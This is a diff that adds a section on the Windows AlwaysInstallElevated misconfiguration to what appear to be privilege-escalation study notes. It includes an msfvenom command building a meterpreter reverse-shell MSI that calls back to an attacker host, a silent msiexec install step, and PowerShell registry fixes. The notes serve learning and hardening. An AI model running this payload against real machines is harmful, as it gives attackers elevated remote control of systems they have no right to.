@@ -113,6 +113,32 @@ https://hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/
 
 2. AlwaysInstallElevated - HKLM + HKCU
 
+Usually windows requires users to have admin rights to install systemwide installs. This setting, when enabled in both HKEY_LOCAL_MACHINE and HKEY_CURRENT_USER, allows any user to execute arbitrary code with elevated privileges by creating a malicious MSI installer.
+
+One method to exploit:
+```
+# Generate malicious MSI
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o malicious.msi
+
+# Transfer to target and install
+msiexec /quiet /qn /i C:\temp\malicious.msi
+```
+
+To fix:
+
+Set to 0 or remove the values
+```
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -Value 0
+Set-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -Value 0
+```
+Or remove completely
+```
+Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue
+Remove-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue
+```
+All examples from below source
+
+https://docs.specterops.io/ghostpack-docs/SharpUp-mdx/checks/alwaysinstallelevated
 
 3. Weak Service Permissions - WeakSvc
 
